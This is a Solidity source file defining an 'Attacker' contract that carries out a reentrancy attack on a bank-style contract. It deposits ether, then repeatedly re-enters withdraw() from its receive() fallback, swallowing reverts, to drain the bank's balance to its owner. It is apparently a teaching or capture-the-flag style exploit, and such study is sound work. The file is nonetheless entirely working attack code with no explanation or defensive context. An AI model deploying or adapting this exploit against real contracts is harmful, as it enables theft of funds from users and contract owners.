// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

interface IBank {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

contract Attacker {
    IBank public bank;
    address public owner;
    uint256 public attackAmount;
    uint256 public count;

    constructor(address _bankAddress) {
        bank = IBank(_bankAddress);
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.sender == owner, "Not the owner");
        attackAmount = msg.value;
        count = 0;
        bank.deposit{value: msg.value}();
        bank.withdraw(attackAmount);
    }

    receive() external payable {
        count++;
        if (count < 10 && address(bank).balance >= attackAmount) {
            try bank.withdraw(attackAmount) {
                // success
            } catch {
                // swallow revert so receive() never reverts
            }
        }
    }

    function withdrawFunds() external {
        require(msg.sender == owner, "Not the owner");
        payable(owner).transfer(address(this).balance);
    }
}